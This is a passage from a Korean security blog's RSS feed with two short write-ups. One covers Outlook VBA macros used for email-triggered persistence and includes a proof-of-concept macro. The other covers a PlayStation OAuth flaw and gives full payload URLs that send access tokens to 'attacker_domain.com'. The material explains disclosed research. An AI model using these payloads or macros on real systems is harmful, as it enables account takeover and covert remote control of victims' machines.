-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-b</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 Outlook</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook은 Microsoft Office의 이메일 클라이언트로 일정 관리, 연락처 관리, 일지 등의 다양한 기능을 제공합니다. 그중 다른 Office 제품들과 마찬가지로 Outlook은 VBA(Visaul Basic for Application) 기반 매크로를 만들어 사용하는 기능이 있고, 해커는 이를 악용해 persistence access를 얻을 수 있습니다.</p><p>Persistence access란 해커가 victim에 initial access를 획득한 이후에도 지속적으로 access 할 수 있는 상태입니다. 특정 제목의 이메일이 도착하면 트리거 되는 악성 매크로를 victim에 심어놓으면 해커는 단순히 이메일을 보내는 것만으로 원격 제어할 수 있습니다.</p><pre><div class="caption"><span>basic</span></div><code class="hljs visual">Option ExplicitPrivate WithEvents olInboxItems As ItemsPrivate Sub Application_Startup()    Set olInboxItems &#x3D; Session.GetDefaultFolder(olFolderInbox).ItemsEnd SubPrivate Sub olInboxItems_ItemAdd(ByVal Item As Object)    On Error Resume Next    Dim olMailItem As MailItem    If TypeOf Item Is MailItem Then       If InStr(olMailItem.Subject, &quot;MDSec&quot;) &gt; 0 Then            MsgBox &quot;Hack The Planet&quot;            Shell &quot;calc.exe&quot;            olMailItem.Delete        End If    End If    Set Item &#x3D; Nothing    Set olMailItem &#x3D; NothingEnd Sub</code></pre><p>위 POC 코드는 calc.exe를 실행하는 VBA 매크로입니다. 우선 Outlook이 실행됐을 때의 수신 메일함 상태를 저장합니다. 이후에 새로운 이메일이 추가되면 그 이메일의 제목을 확인하고, 만약 그 제목이 “MDSec”이라면 calc.exe를 실행한 후 해당 이메일을 삭제합니다.</p><p>이메일의 제목뿐만 아니라 발신 주소 혹은 내용 등으로 매크로의 트리거 조건을 다양하게 설정할 수 있고, calc.exe 대신 리버스 쉘을 실행하면 해커가 원격 제어를 할 수 있게 됩니다. </p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/outlook/">outlook</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/email/">email</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/persistence-access/">persistence access</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/25/fabu1ous/2020-11-25/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] Access token stealing in playstation</title>
-      <link>https://hackyboiz.github.io/2020/11/24/l0ch/2020-11-24/</link>
-      <guid>https://hackyboiz.github.io/2020/11/24/l0ch/2020-11-24/</guid>
-      <pubDate>Tue, 24 Nov 2020 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/821896&quot;&gt;Access token steali</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/821896">Access token stealing in playstation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a href="https://my.playstation.com/">https://my.playstation.com</a></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>콘솔 게임기기인 PlayStation의 커뮤니티 <a href="https://my.playstation.com/auth/response.html%EC%97%90%EC%84%9C">https://my.playstation.com/auth/response.html에서</a> 로그인된 사용자의 Access Token을 탈취할 수 있는 취약점이 발견되었습니다.</p><p><a href="https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com">https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com</a> 페이지는 발급 서버에서 클라이언트로 OAuth 액세스 토큰을 전송하는 자바스크립트를 호스팅 합니다.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseResponse</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = a.hash.substr(<span class="hljs-number">1</span>),        c = a.search.substr(<span class="hljs-number">1</span>),        d = b + <span class="hljs-string">&quot;&amp;&quot;</span> + c,        e = convertToObject(d);    <span class="hljs-keyword">return</span> e.refererURL = a.toString(), e&#125;....<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResponseToApp</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = extractFrameTypeFromRequestID(a.requestID),        c = a.targetOrigin || getOrigin(),        d = a.baseUrl || <span class="hljs-string">&quot;&quot;</span>,        e = a.returnRoute || <span class="hljs-string">&quot;&quot;</span>,        f = a.excludeQueryParams,        g = !f &amp;&amp; <span class="hljs-built_in">window</span>.location.search || <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">switch</span> (b) &#123;...        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;window&quot;</span>:            <span class="hljs-built_in">window</span>.opener.postMessage(a, c);            <span class="hljs-keyword">break</span>;...    &#125;&#125;<span class="hljs-keyword">var</span> response = parseResponse(<span class="hljs-built_in">window</span>.location);sendResponseToApp(response);</code></pre><p>호스팅된 위 자바스크립트에서 아래 과정을 통해 access token을 해커의 서버로 전송할 수 있습니다.</p><ol><li>request query를 <code>parseResponse()</code> 함수에서 파싱 한 뒤  <code>sendResponseToApp()</code> 의 매개변수로 전달해 호출합니다.</li><li>query 중 <code>reqeustID</code> 필드 값이 “window” 면 <code>window.opener.postMessage()</code>를 호출합니다.</li><li><code>window.opener.postMessage()</code> 는 첫 번째 매개변수를 두 번째 매개변수인 특정 도메인으로 전달할 수 있습니다. 매개변수로 query와 <code>targetOrigin</code> 필드 값이 전달되면 <code>targetOrigin</code> 도메인으로 query에 포함되어 있는 Access Token을 전송할 수 있습니다.</li></ol><p>이를 이용한 최종 페이로드는 다음과 같습니다.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com </span></code></pre><p>위 페이로드를 OAuth 발급 서버 request query의 <code>redirect_uri</code> 필드 값으로 보내면 Access Token을 탈취할 수 있습니다.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;scope=capone:report_submission,kamaji:game_list,kamaji:get_account_hash,user:account.get,user:account.profile.get,kamaji:social_get_graph,kamaji:ugc:distributor,user:account.identityMapper,kamaji:music_views,kamaji:activity_feed_get_feed_privacy,kamaji:activity_feed_get_news_feed,kamaji:activity_feed_submit_feed_story,kamaji:activity_feed_internal_feed_submit_story,kamaji:account_link_token_web,kamaji:ugc:distributor_web,kamaji:url_preview&amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2&amp;redirect_uri=https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com/&amp;prompt=non</span></code></pre>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/access-token-stealing/">access token stealing</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/playstation/">playstation</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/javascript/">javascript</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/24/l0ch/2020-11-24/#disqus_thread</comments>
       
     </item>
     
